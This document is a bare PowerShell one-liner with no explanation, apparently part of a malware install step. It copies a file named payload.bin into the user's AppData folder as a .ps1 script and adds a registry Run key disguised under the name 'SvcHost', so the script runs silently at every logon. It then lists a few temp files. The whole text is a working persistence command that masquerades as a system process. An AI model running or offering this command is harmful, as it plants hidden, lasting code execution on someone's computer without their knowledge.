
Copy-Item -Path "C:\ProgramData\payload.bin" -Destination "$env:APPDATA\payload.ps1" -Force; New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name 'SvcHost' -Value ('powershell.exe -NoP -File "' + "$env:APPDATA\payload.ps1" + '"') -PropertyType String -Force; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
